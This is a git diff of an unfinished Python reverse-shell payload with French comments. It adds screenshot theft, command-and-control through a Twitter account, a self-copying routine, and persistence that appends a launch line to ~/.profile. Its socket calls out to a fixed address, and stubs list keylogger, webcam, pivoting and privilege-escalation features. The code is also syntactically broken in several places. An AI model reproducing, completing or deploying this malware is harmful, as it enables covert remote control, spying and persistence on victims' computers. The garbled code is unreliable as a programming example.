@@ -3,7 +3,12 @@
 import subprocess
 import sys
 import os
+
+##variable
+os = 0
 #os.popen("sudo /usr/bin/pip3 install --upgrade typing")
+
+##installation des lib nécéssaire au payload
 try:
     import mss
 except ImportError:
@@ -45,24 +50,38 @@ finally:
 
 message = str()
 #### Client ######
-##Attendre une connexion
+###Def fonction####
 
+## Création du fichier
+def createProgramme():
+    content = open(__file__).read()
+    new_name= "payloadReverShell"
+
+    with open(new_name+".py","w") as f:
+    f.write(content)
+
+    new_file= new_name+".py"
+    process = subprocess.Popen(["python", new_file], shell=False)
+
+##Def detection os
 def detectos():
     try:
         detectcmd = "lsb_release -a"
         resultDetectos = subprocess.Popen(detectcmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        os= 1
     except:
         pass
     try:
         dtectcmd = "systeminfo"
         resultDetectos = subprocess.Popen(detectcmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        if os == 1
+        else
+            os = 2
     except:
         pass
     return resultDetectos
 
-
-
-
+##def screenshot
 def screen():
     with mss() as sct :
         sct.shot()
@@ -70,7 +89,7 @@ def screen():
         data=  f.read()
         f.close()
     return data
-
+## fonction récupération d'un tweet et interprétation (a supprimer)
 def candc():
     url = "http://twitter.com/S1mpleCC"
     data = requests.get(url)
@@ -81,6 +100,14 @@ def candc():
 
 #écrire dans le profile pour persistant
 #def persistant():
+def persistant():
+    if os == 1
+        os.walk('~/.profile')
+        createProgramme()
+        cmd = "echo  \n "if [ -r payloadReverShell\.py] ; then" \n \v "python3 payloadReverShell\.py" \n "fi"  >> ~/.profile "
+    elif os == 2
+
+    return
 ##def  Keylogger():
 ##def webcam():
 ##def pivoting():
@@ -92,13 +119,13 @@ def candc():
 ##def popup():
 ##def popuptexte():
 ##def privilege():
-##def logs():    
+##def logs():
 
 
-
+##Attendre une connexion
 mon_socket = s.socket(s.AF_INET,s.SOCK_STREAM)
 
-
+##MAIN###
 ### Fonction connect((host,port)
 
 mon_socket.connect(("192.168.1.196",1243))
